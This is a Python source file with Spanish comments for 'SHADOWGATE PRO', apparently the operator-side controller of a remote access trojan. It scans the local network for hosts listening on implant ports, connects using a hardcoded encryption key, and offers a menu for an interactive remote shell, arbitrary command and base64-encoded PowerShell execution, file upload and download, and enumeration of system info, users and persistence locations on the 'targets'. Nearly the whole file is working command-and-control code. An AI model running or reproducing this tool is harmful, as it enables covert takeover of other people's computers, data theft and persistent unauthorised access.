#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
import json
import struct
import threading
from cryptography.fernet import Fernet
from termcolor import colored
import pyfiglet
import netifaces
import time
import select
import base64
import requests
import os
import subprocess
import random


class AdvancedShadowGateController:
    def __init__(self):
        self.target_ip = None
        self.socket = None
        self.connected = False
        self.connection_persistent = False

        # 🔑 CLAVE COMPATIBLE con el servidor mejorado
        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)

        # Configuración avanzada
        self.scan_timeout = 1
        self.command_timeout = 30
        self.reconnect_attempts = 3

    def scan_network_advanced(self, ports=[5560, 5555, 8080, 443]):
        """Escanéo avanzado de red con múltiples puertos y técnicas"""
        print(colored("🔍 Escaneo avanzado de red en progreso...", 'yellow'))

        targets_found = []

        try:
            # Obtener todas las interfaces de red
            interfaces = netifaces.interfaces()

            for interface in interfaces:
                try:
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        for addr_info in addrs[netifaces.AF_INET]:
                            if 'addr' in addr_info and 'netmask' in addr_info:
                                ip = addr_info['addr']
                                netmask = addr_info['netmask']

                                # Calcular rango de red
                                network = self.calculate_network(ip, netmask)
                                if network:
                                    print(colored(f"📡 Escaneando red: {network}", 'blue'))
                                    targets = self.scan_network_range(network, ports)
                                    targets_found.extend(targets)
                except:
                    continue

            return list(set(targets_found))  # Eliminar duplicados

        except Exception as e:
            print(colored(f"❌ Error en escaneo avanzado: {e}", 'red'))
            return self.scan_network()  # Fallback al método básico

    def calculate_network(self, ip, netmask):
        """Calcular dirección de red desde IP y máscara"""
        try:
            ip_parts = list(map(int, ip.split('.')))
            mask_parts = list(map(int, netmask.split('.')))

            network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
            return '.'.join(map(str, network_parts)) + '.0/24'
        except:
            return None

    def scan_network_range(self, network_cidr, ports):
        """Escanear rango de red específico"""
        targets = []
        base_ip = network_cidr.split('/')[0][:-2]  # Remover /24 y último octeto

        def scan_ip_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.scan_timeout)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    targets.append((ip, port))
                    print(colored(f"   ✅ Objetivo: {ip}:{port}", 'green'))
            except:
                pass

        threads = []
        for port in ports:
            for i in range(1, 255):
                ip = f"{base_ip}{i}"
                thread = threading.Thread(target=scan_ip_port, args=(ip, port))
                threads.append(thread)
                thread.start()

                # Limitar hilos concurrentes
                if len(threads) >= 100:
                    for t in threads:
                        t.join()
                    threads = []

        for thread in threads:
            thread.join()

        return targets

    def smart_connect(self, target_info=None):
        """Conexión inteligente con múltiples estrategias"""
        if target_info:
            ip, port = target_info
            return self.connect(ip, port)

        # Escaneo inteligente
        targets = self.scan_network_advanced()

        if not targets:
            print(colored("❌ No se encontraron objetivos", 'red'))
            return False

        # Intentar conectar por orden de prioridad
        for target in targets:
            ip, port = target
            if self.connect(ip, port):
                return True

        return False

    def connect(self, ip, port=5560):
        """Conectar al objetivo con manejo mejorado de errores"""
        for attempt in range(self.reconnect_attempts):
            try:
                self.target_ip = ip
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((ip, port))
                self.connected = True
                self.connection_persistent = True

                print(colored(f"✅ Conectado persistentemente a {ip}:{port}", 'green'))

                # Iniciar hilo de keep-alive
                self.start_keep_alive()
                return True

            except Exception as e:
                print(colored(f"❌ Intento {attempt + 1} fallado: {e}", 'red'))
                time.sleep(2)

        return False

    def start_keep_alive(self):
        """Mantener conexión viva"""

        def keep_alive():
            while self.connection_persistent and self.connected:
                try:
                    # Enviar heartbeat cada 30 segundos
                    time.sleep(30)
                    if self.connected:
                        heartbeat = {'type': 'heartbeat', 'data': {'status': 'alive'}}
                        self.send_raw_command(heartbeat)
                except:
                    self.connected = False
                    break

        threading.Thread(target=keep_alive, daemon=True).start()

    def send_raw_command(self, command):
        """Enviar comando sin procesar respuesta"""
        if not self.connected:
            return False

        try:
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)
            return True
        except:
            self.connected = False
            return False

    def send_command(self, command_type, data=None, expect_response=True):
        """Enviar comando cifrado con timeout mejorado"""
        if not self.connected:
            print(colored("❌ No conectado. Usa connect() primero.", 'red'))
            return None

        try:
            command = {
                'type': command_type,
                'data': data or {},
                'timestamp': time.time()
            }

            # Cifrar comando
            encrypted_cmd = self.cipher.encrypt(json.dumps(command).encode())

            # Enviar tamaño + datos
            self.socket.send(struct.pack('!I', len(encrypted_cmd)))
            self.socket.send(encrypted_cmd)

            if not expect_response:
                return {'success': True, 'message': 'Comando enviado sin esperar respuesta'}

            # Esperar respuesta con select para timeout
            ready = select.select([self.socket], [], [], self.command_timeout)
            if not ready[0]:
                print(colored("⏰ Timeout esperando respuesta", 'yellow'))
                return {'success': False, 'error': 'Timeout esperando respuesta'}

            # Recibir tamaño de respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return {'success': False, 'error': 'No se recibió tamaño de respuesta'}

            size = struct.unpack('!I', size_data)[0]
            response_data = b''

            # Recibir datos con timeout
            start_time = time.time()
            while len(response_data) < size:
                if time.time() - start_time > self.command_timeout:
                    print(colored("⏰ Timeout recibiendo datos", 'yellow'))
                    return {'success': False, 'error': 'Timeout recibiendo datos'}

                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    break
                response_data += chunk

            # Descifrar respuesta
            decrypted_response = self.cipher.decrypt(response_data)
            return json.loads(decrypted_response.decode())

        except Exception as e:
            print(colored(f"❌ Error enviando comando: {e}", 'red'))
            self.connected = False
            return {'success': False, 'error': f'Error de conexión: {str(e)}'}

    def execute_command(self, cmd, wait=True):
        """Ejecutar comando en el objetivo"""
        return self.send_command('system_command', {'command': cmd}, wait)

    def execute_powershell(self, script):
        """Ejecutar script PowerShell"""
        # Codificar script en base64 para evitar problemas de comillas
        encoded_script = base64.b64encode(script.encode('utf-16le')).decode()
        ps_command = f"powershell -EncodedCommand {encoded_script}"
        return self.execute_command(ps_command)

    def upload_file(self, local_path, remote_path):
        """Subir archivo al objetivo"""
        try:
            with open(local_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()

            command = {
                'command': f'echo {file_data} | base64 -d > "{remote_path}"'
            }
            return self.send_command('system_command', command)
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def download_file(self, remote_path, local_path):
        """Descargar archivo del objetivo"""
        try:
            # Primero leer el archivo en el objetivo
            result = self.execute_command(f'type "{remote_path}"')
            if result and result.get('success'):
                file_data = base64.b64decode(result['output'])
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                return {'success': True}
            return result or {'success': False, 'error': 'No response from target'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def get_system_info(self):
        """Obtener información detallada del sistema"""
        info_commands = {
            'systeminfo': 'systeminfo',
            'network': 'ipconfig /all',
            'processes': 'tasklist',
            'services': 'sc query',
            'users': 'net user',
            'drives': 'wmic logicaldisk get size,freespace,caption'
        }

        results = {}
        for name, cmd in info_commands.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[name] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[name] = f"Error: {error_msg}"

        return results

    def file_explorer(self, path="C:\\"):
        """Explorador de archivos avanzado"""
        commands = {
            'list': f'dir "{path}"',
            'details': f'fsutil file layout "{path}"',
            'perms': f'icacls "{path}"'
        }

        results = {}
        for action, cmd in commands.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[action] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[action] = f"Error: {error_msg}"

        return results

    def persistence_check(self):
        """Verificar métodos de persistencia en el objetivo"""
        checks = {
            'registry': 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            'tasks': 'schtasks /query /fo list',
            'services': 'sc query',
            'startup': 'dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
        }

        results = {}
        for name, cmd in checks.items():
            result = self.execute_command(cmd)
            if result and result.get('success'):
                results[name] = result['output']
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'No response'
                results[name] = f"Error: {error_msg}"

        return results

    def remote_shell(self):
        """Shell remoto interactivo"""
        print(colored("🐚 Iniciando shell remoto interactivo...", 'green'))
        print(colored("   Escribe 'exit' para salir", 'yellow'))

        while self.connected:
            try:
                cmd = input(colored("remote-shell> ", 'cyan'))

                if cmd.lower() in ['exit', 'quit']:
                    break

                if cmd.strip():
                    result = self.execute_command(cmd)
                    if result and result.get('success'):
                        print(result['output'])
                    elif result:
                        print(colored(f"Error: {result.get('error', 'Unknown error')}", 'red'))
                    else:
                        print(colored("❌ No response from target", 'red'))

            except KeyboardInterrupt:
                print(colored("\n🛑 Shell interrumpido", 'yellow'))
                break
            except Exception as e:
                print(colored(f"❌ Error en shell: {e}", 'red'))
                break

    def show_banner(self):
        """Mostrar banner mejorado"""
        banner = pyfiglet.figlet_format("SHADOWGATE PRO", font="slant")
        print(colored(banner, 'cyan'))
        print(colored("🔥 Advanced Remote Control System", 'yellow'))
        print(colored("📡 Conexión Persistente | 🚀 Comandos Avanzados", 'magenta'))
        print("=" * 70)

    def interactive_menu(self):
        """Menú interactivo mejorado"""
        self.show_banner()

        while True:
            print("\n" + "=" * 70)
            print(colored("🎮 MENÚ DE CONTROL AVANZADO", 'magenta', attrs=['bold']))
            print("=" * 70)

            if self.connected:
                status = colored("✅ CONECTADO", 'green')
                if self.connection_persistent:
                    status += colored(" (PERSISTENTE)", 'cyan')
                print(f"{status} a: {self.target_ip}")
            else:
                print(colored("❌ SIN CONEXIÓN", 'red'))

            print("\n" + colored("🔗 Conexión", 'yellow'))
            print("1. 🔍 Escaneo inteligente y conexión automática")
            print("2. 📡 Conectar a IP específica")
            print("3. 🚪 Desconectar")

            print("\n" + colored("📊 Sistema", 'green'))
            print("4. 🖥️  Información completa del sistema")
            print("5. 📁 Explorador de archivos avanzado")
            print("6. 🔍 Verificar persistencia")

            print("\n" + colored("⚡ Ejecución", 'blue'))
            print("7. 🐚 Shell remoto interactivo")
            print("8. ⚡ Ejecutar comando personalizado")
            print("9. 📜 Ejecutar script PowerShell")

            print("\n" + colored("📁 Archivos", 'cyan'))
            print("10. ⬆️  Subir archivo al objetivo")
            print("11. ⬇️️ Descargar archivo del objetivo")

            print("\n" + colored("🛠️ Utilidades", 'magenta'))
            print("12. 🔄 Re-escanear objetivos")
            print("13. 🧪 Test de conexión")
            print("0. 🏃 Salir")
            print("=" * 70)

            choice = input(colored("👉 Selecciona opción: ", 'white')).strip()

            if choice == "1":
                if self.smart_connect():
                    print(colored("🎯 Conexión inteligente exitosa!", 'green'))
                else:
                    print(colored("❌ No se pudo conectar", 'red'))

            elif choice == "2":
                target = input("IP del objetivo: ").strip()
                port = input("Puerto (5560): ").strip() or "5560"
                if target:
                    self.connect(target, int(port))

            elif choice == "3":
                self.disconnect()
                print(colored("🔌 Desconectado", 'yellow'))

            elif choice == "4" and self.connected:
                print(colored("🖥️  Recopilando información del sistema...", 'yellow'))
                info = self.get_system_info()
                for section, content in info.items():
                    print(f"\n{colored(f'📋 {section.upper()}:', 'green')}")
                    print(content[:500] + "..." if len(content) > 500 else content)

            elif choice == "5" and self.connected:
                path = input("Ruta (ej: C:\\Users): ").strip() or "C:\\"
                print(colored(f"📁 Explorando: {path}", 'yellow'))
                result = self.file_explorer(path)
                for action, output in result.items():
                    print(f"\n{colored(f'📊 {action}:', 'cyan')}")
                    print(output[:1000] + "..." if len(output) > 1000 else output)

            elif choice == "6" and self.connected:
                print(colored("🔍 Verificando persistencia...", 'yellow'))
                persistence = self.persistence_check()
                for method, output in persistence.items():
                    print(f"\n{colored(f'📝 {method}:', 'magenta')}")
                    print(output[:1000] + "..." if len(output) > 1000 else output)

            elif choice == "7" and self.connected:
                self.remote_shell()

            elif choice == "8" and self.connected:
                cmd = input("Comando a ejecutar: ").strip()
                if cmd:
                    result = self.execute_command(cmd)
                    if result and result.get('success'):
                        print(colored("✅ Comando ejecutado:", 'green'))
                        print(result.get('output', ''))
                        if result.get('error'):
                            print(colored("⚠️  Errores:", 'yellow'))
                            print(result.get('error', ''))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(colored(f"❌ Error ejecutando comando: {error_msg}", 'red'))

            elif choice == "9" and self.connected:
                script = input("Script PowerShell: ").strip()
                if script:
                    result = self.execute_powershell(script)
                    if result and result.get('success'):
                        print(colored("✅ Script ejecutado:", 'green'))
                        print(result.get('output', ''))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(colored(f"❌ Error ejecutando script: {error_msg}", 'red'))

            elif choice == "10" and self.connected:
                local = input("Ruta local del archivo: ").strip()
                remote = input("Ruta remota destino: ").strip()
                if local and remote:
                    result = self.upload_file(local, remote)
                    if result and result.get('success'):
                        print(colored("✅ Archivo subido exitosamente", 'green'))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(colored(f"❌ Error subiendo archivo: {error_msg}", 'red'))

            elif choice == "11" and self.connected:
                remote = input("Ruta remota del archivo: ").strip()
                local = input("Ruta local destino: ").strip()
                if remote and local:
                    result = self.download_file(remote, local)
                    if result and result.get('success'):
                        print(colored("✅ Archivo descargado exitosamente", 'green'))
                    else:
                        error_msg = result.get('error', 'Unknown error') if result else 'No response'
                        print(colored(f"❌ Error descargando archivo: {error_msg}", 'red'))

            elif choice == "12":
                targets = self.scan_network_advanced()
                if targets:
                    print(colored(f"🎯 Objetivos encontrados:", 'green'))
                    for ip, port in targets:
                        print(f"   {ip}:{port}")
                else:
                    print(colored("❌ No se encontraron objetivos", 'red'))

            elif choice == "13" and self.connected:
                print(colored("🧪 Probando conexión...", 'yellow'))
                result = self.execute_command("echo Connection Test Successful")
                if result and result.get('success'):
                    print(colored("✅ Conexión funcionando correctamente", 'green'))
                else:
                    error_msg = result.get('error', 'Unknown error') if result else 'No response'
                    print(colored(f"❌ Problemas de conexión: {error_msg}", 'red'))

            elif choice == "0":
                self.disconnect()
                print(colored("👋 Saliendo...", 'blue'))
                break

            else:
                print(colored("❌ Opción no válida", 'red'))

            if choice != "0":
                input(colored("\n📍 Presiona Enter para continuar...", 'white'))

    def disconnect(self):
        """Desconectar limpiamente"""
        if self.connected:
            try:
                # Enviar comando de desconexión
                disconnect_cmd = {'type': 'disconnect', 'data': {}}
                self.send_raw_command(disconnect_cmd)
            except:
                pass
            finally:
                self.connection_persistent = False
                self.connected = False
                if self.socket:
                    self.socket.close()
                print(colored("🔌 Desconectado", 'yellow'))

    def test_connection(self):
        """Probar conexión automática mejorada"""
        print(colored("🧪 Iniciando prueba avanzada de conexión...", 'yellow'))

        if self.smart_connect():
            print(colored("✅ Conexión inteligente exitosa!", 'green'))

            # Probar comandos básicos
            tests = [
                ("systeminfo", "Información del sistema"),
                ("whoami", "Usuario actual"),
                ("hostname", "Nombre del equipo")
            ]

            for cmd, description in tests:
                print(colored(f"🧪 Probando: {description}...", 'yellow'))
                result = self.execute_command(cmd)
                if result and result.get('success'):
                    print(colored(f"✅ {description} funcionando:", 'green'))
                    print(result.get('output', '')[:200] + "...")
                else:
                    error_msg = result.get('error', 'Unknown error') if result else 'No response'
                    print(colored(f"❌ Error en {description}: {error_msg}", 'red'))

            self.disconnect()
        else:
            print(colored("❌ No se pudo conectar automáticamente", 'red'))


# Función principal mejorada
def main():
    """Función principal del controlador avanzado"""
    controller = AdvancedShadowGateController()

    # Banner inicial
    controller.show_banner()

    # Opciones de inicio
    print(colored("\n🚀 Opciones de inicio:", 'yellow'))
    print("1. 🧪 Ejecutar test de conexión automática")
    print("2. 🎮 Entrar directamente al menú interactivo")
    print("3. 🔍 Solo escanear red")

    choice = input(colored("👉 Selecciona opción: ", 'white')).strip()

    if choice == "1":
        controller.test_connection()
        input(colored("\n📍 Presiona Enter para continuar al menú...", 'white'))
        controller.interactive_menu()
    elif choice == "2":
        controller.interactive_menu()
    elif choice == "3":
        targets = controller.scan_network_advanced()
        if targets:
            print(colored(f"🎯 Objetivos encontrados:", 'green'))
            for ip, port in targets:
                print(f"   {ip}:{port}")
        else:
            print(colored("❌ No se encontraron objetivos", 'red'))
    else:
        print(colored("ℹ️  Iniciando modo interactivo...", 'yellow'))
        controller.interactive_menu()


if __name__ == "__main__":
    main()